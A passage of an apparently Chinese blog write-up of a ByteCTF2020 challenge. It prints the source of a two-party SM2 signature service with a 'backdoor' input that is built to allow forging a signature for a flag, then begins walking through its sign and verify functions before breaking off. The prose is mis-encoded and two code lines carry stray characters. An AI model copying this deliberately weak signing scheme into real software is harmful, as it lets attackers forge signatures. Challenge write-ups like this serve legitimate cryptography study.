class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import func, sm2</span><br><span class="line"><span class="comment">#from flag import FLAG</span></span><br><span class="line">flag=<span class="string">"Congratulations!"</span></span><br><span class="line">sm2p256v1_ecc_table = &#123;</span><br><span class="line">    <span class="string">'n'</span>: <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span>,</span><br><span class="line">    <span class="string">'p'</span>: <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF'</span>,</span><br><span class="line">    <span class="string">'g'</span>: <span class="string">'32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7'</span> +</span><br><span class="line">         <span class="string">'bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0'</span>,</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93'</span>,</span><br><span class="line">&#125;</span><br><span class="line">n = <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span></span><br><span class="line">G = <span class="string">'32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7'</span> \</span><br><span class="line">    <span class="string">'bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(tsm2)</span></span><span class="symbol">:</span></span><br><span class="line">    data = func.random_hex(len(n)) </span><br><span class="line">    k1_str = func.random_hex(len(n))</span><br><span class="line">    print(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = input(<span class="string">'backdoor:'</span>).strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(tsm2)</span></span><span class="symbol">:</span></span><br><span class="line">    message = input(<span class="string">'msg:'</span>).strip().encode().strip(b<span class="string">'\x00'</span>)</span><br><span class="line">    sign = input(<span class="string">'sign:'</span>).strip().encode().strip(b<span class="string">'\x00'</span>)</span><br><span class="line">    check = tsm2.verify(sign, message)</span><br><span class="line">    <span class="keyword">if</span> check is True <span class="keyword">and</span> message == b<span class="string">'Hello, Welcome to ByteCTF2020!'</span><span class="symbol">:</span></span><br><span class="line">        print(FLAG)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        print(check)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TSM2</span>(<span class="title">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, sk)</span></span><span class="symbol">:</span></span><br><span class="line">        ecc_table = sm2p256v1_ecc_table</span><br><span class="line">        <span class="keyword">self</span>.ecc_table = ecc_table</span><br><span class="line">        <span class="keyword">self</span>.n = int(ecc_table[<span class="string">'n'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.para_len = len(ecc_table[<span class="string">'n'</span>])</span><br><span class="line">        <span class="keyword">self</span>.ecc_a3 = (int(ecc_table[<span class="string">'a'</span>], base=<span class="number">16</span>) + <span class="number">3</span>) % int(ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.sk = int(sk, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.pk = <span class="keyword">self</span>._kg(<span class="keyword">self</span>.sk, ecc_table[<span class="string">'g'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">self</span>.sks = int(func.random_hex(<span class="keyword">self</span>.para_len), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.pks = pow((<span class="keyword">self</span>.sk + <span class="number">1</span>) * <span class="keyword">self</span>.sks, <span class="keyword">self</span>.n - <span class="number">2</span>, <span class="keyword">self</span>.n) % <span class="keyword">self</span>.n</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_p1</span><span class="params">(<span class="keyword">self</span>, data, k1_str)</span></span><span class="symbol">:</span></span><br><span class="line">        e = int(data, <span class="number">16</span>)</span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        k1 = k1 % <span class="keyword">self</span>.n</span><br><span class="line">        R1 = <span class="keyword">self</span>._kg(k1, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>]) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%0128s'</span> % (e, R1) </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output_p1</span><span class="params">(<span class="keyword">self</span>, k1_str, r_s2_s3)</span></span><span class="symbol">:</span></span><br><span class="line">        r = int(r_s2_s3[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s2 = int(r_s2_s3[<span class="keyword">self</span>.<span class="symbol">para_len:</span><span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s3 = int(r_s2_s3[<span class="number">2</span> * <span class="keyword">self</span>.<span class="symbol">para_len:</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        d1 = <span class="keyword">self</span>.sksã€</span><br><span class="line">        s = (d1 * k1 * s2 + d1 * s3 - r) % <span class="keyword">self</span>.n </span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span> <span class="keyword">or</span> s == (<span class="keyword">self</span>.n - r)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%064x'</span> % (r, s)  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(<span class="keyword">self</span>, Sign, data)</span></span><span class="symbol">:</span></span><br><span class="line">        r = int(Sign[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s = int(Sign[<span class="keyword">self</span>.<span class="symbol">para_len:</span><span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        e = int(data.hex(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % <span class="keyword">self</span>.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = <span class="keyword">self</span>._kg(s, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>])</span><br><span class="line">        P2 = <span class="keyword">self</span>._kg(t, <span class="keyword">self</span>.pk)ã€</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="symbol">P2:</span></span><br><span class="line">            P1 = <span class="string">'%s%s'</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = <span class="keyword">self</span>._double_point(P1)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            P1 = <span class="string">'%s%s'</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = <span class="keyword">self</span>._add_point(P1, P2)</span><br><span class="line">            P1 = <span class="keyword">self</span>._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = int(P1[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % <span class="keyword">self</span>.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_kg</span><span class="params">(<span class="keyword">self</span>, k, Point)</span></span>: </span><br><span class="line">        <span class="keyword">if</span> (k % <span class="keyword">self</span>.n) == <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'0'</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">'%s%s'</span> % (Point, <span class="string">'1'</span>)</span><br><span class="line">        mask_str = <span class="string">'8'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="keyword">self</span>.para_len - <span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">            mask_str += <span class="string">'0'</span></span><br><span class="line">        mask = int(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = False</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="keyword">self</span>.para_len * <span class="number">4</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">flag:</span></span><br><span class="line">                Temp = <span class="keyword">self</span>._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">                <span class="keyword">if</span> <span class="symbol">flag:</span></span><br><span class="line">                    Temp = <span class="keyword">self</span>._add_point(Temp, Point)</span><br><span class="line">                <span class="symbol">else:</span></span><br><span class="line">                    flag = True</span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._convert_jacb_to_nor(Temp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_double_point</span><span class="params">(<span class="keyword">self</span>, Point)</span></span>: </span><br><span class="line">        l = len(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; <span class="keyword">self</span>.para_len * <span class="number">2</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            x1 = int(Point[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = int(Point[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == <span class="symbol">len_2:</span></span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                z1 = int(Point[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (<span class="keyword">self</span>.ecc_a3 * T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span><span class="symbol">:</span></span><br><span class="line">                T4 = (T5 + ((T5 + int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)) <span class="meta">&gt;&gt; </span><span class="number">1</span>) - T3) % int(self.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                T4 = (T5 + (T5 <span class="meta">&gt;&gt; </span><span class="number">1</span>) - T3) % int(self.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_point</span><span class="params">(<span class="keyword">self</span>, P1, P2)</span></span>: </span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">'0'</span> * <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'%s%s'</span> % (P2, <span class="string">'1'</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">'0'</span> * <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'%s%s'</span> % (P1, <span class="string">'1'</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        l1 = len(P1)</span><br><span class="line">        l2 = len(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            X1 = int(P1[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = int(P1[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == <span class="symbol">len_2:</span></span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                Z1 = int(P1[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line">            x2 = int(P2[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = int(P2[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_convert_jacb_to_nor</span><span class="params">(<span class="keyword">self</span>, Point)</span></span>: </span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        x = int(Point[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        y = int(Point[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">        z = int(Point[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line">        z_inv = pow(z, int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>) - <span class="number">2</span>, int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span><span class="symbol">:</span></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    sk = func.random_hex(len(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">    tsm2 = TSM2(sk)</span><br><span class="line">    print(<span class="string">'pk:%s'</span>   %tsm2.pk)</span><br><span class="line">    print(<span class="string">'pks:%064x'</span>%tsm2.pks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)<span class="symbol">:</span></span><br><span class="line">        op = input(<span class="string">'op: '</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'sign'</span><span class="symbol">:</span></span><br><span class="line">            sign(tsm2)</span><br><span class="line">        elif op == <span class="string">'verify'</span><span class="symbol">:</span></span><br><span class="line">            verify(tsm2)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            print(<span class="string">""</span><span class="string">"sign: sign message</span></span><br><span class="line"><span class="string">verify: verify message"</span><span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>å•Šï¼Œè¿™ç¬¬äºŒé¢˜ç”»é£å°±çªå˜ï¼Œå¥½é•¿çš„ä»£ç ï¼Œè®©äººå¤±å»æ¬²æœ›ã€‚ä½†å…¶å®å‘¢ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯å¯¹sm2çš„ä¸€ä¸ªå®ç°ï¼Œå…¶å®ä¸ç”¨ç»†ç©¶ã€‚è¿™é‡Œæˆ‘ä»¬å°±ç›´æ¥å…ˆæå–å…³é”®éƒ¨åˆ†ï¼Œä¸€æ­¥ä¸€æ­¥æ¥å•¦ã€‚</p><p>é¦–å…ˆæœ€ä¸Šé¢çš„</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">sign</span>(tsm2):</span><br><span class="line">    data = func.random_hex(<span class="built_in">len</span>(n)) </span><br><span class="line">    k1_str = func.random_hex(<span class="built_in">len</span>(n))</span><br><span class="line">    <span class="keyword">print</span>(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = <span class="built_in">input</span>(<span class="string">'backdoor:'</span>).strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line">def verify(tsm2):</span><br><span class="line">    message = <span class="built_in">input</span>(<span class="string">'msg:'</span>).strip().encode().strip(<span class="keyword">b</span><span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">sign</span> = <span class="built_in">input</span>(<span class="string">'sign:'</span>).strip().encode().strip(<span class="keyword">b</span><span class="string">'\x00'</span>)</span><br><span class="line">    check = tsm2.verify(<span class="keyword">sign</span>, message)</span><br><span class="line">    <span class="keyword">if</span> check <span class="keyword">is</span> True <span class="built_in">and</span> message == <span class="keyword">b</span><span class="string">'Hello, Welcome to ByteCTF2020!'</span>:</span><br><span class="line">        <span class="keyword">print</span>(FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(check)</span><br></pre></td></tr></table></figure><p>ä¿©åŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯æ³¨å†Œï¼Œä¸€ä¸ªæ˜¯éªŒè¯ï¼Œè·å–flagçš„åœ°æ–¹å°±æ˜¯è¿™ä¸ªéªŒè¯ï¼Œä»–è¦æ±‚ä½ å¯¹messageè¿›è¡Œä¸€ä¸ªç­¾åï¼Œè€Œmessageè¦æ±‚æ˜¯bâ€™Hello, Welcome to ByteCTF2020!â€™</p><p>å¥½çš„ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹å’‹æ ·æ‰èƒ½ç»™è¿™ä¸ªmessageç­¾ä¸Šåï¼Œå»æ‰¾æ‰¾ç­¾åçš„éªŒè¯å‡½æ•°ã€‚</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">def</span> verify(<span class="keyword">self, </span>Sign, <span class="meta">data</span>):</span><br><span class="line">    r = int(Sign[<span class="number">0</span>:<span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    s = int(Sign[<span class="keyword">self.para_len:2 </span>* <span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    e = int(<span class="meta">data</span>.hex(), <span class="number">16</span>)</span><br><span class="line">    t = (r + s) % <span class="keyword">self.n</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">if</span> t == <span class="number">0</span>:</span><br><span class="line">        return <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">P1</span> = <span class="keyword">self._kg(s, </span><span class="keyword">self.ecc_table['g'])</span></span><br><span class="line"><span class="keyword"> </span>   <span class="built_in">P2</span> = <span class="keyword">self._kg(t, </span><span class="keyword">self.pk)</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">if</span> <span class="built_in">P1</span> == <span class="built_in">P2</span>:</span><br><span class="line">        <span class="built_in">P1</span> = <span class="string">'%s%s'</span> % (<span class="built_in">P1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._double_point(P1)</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">else</span>:</span><br><span class="line">        <span class="built_in">P1</span> = <span class="string">'%s%s'</span> % (<span class="built_in">P1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._add_point(P1, </span><span class="built_in">P2</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._convert_jacb_to_nor(P1)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   x = int(<span class="built_in">P1</span>[<span 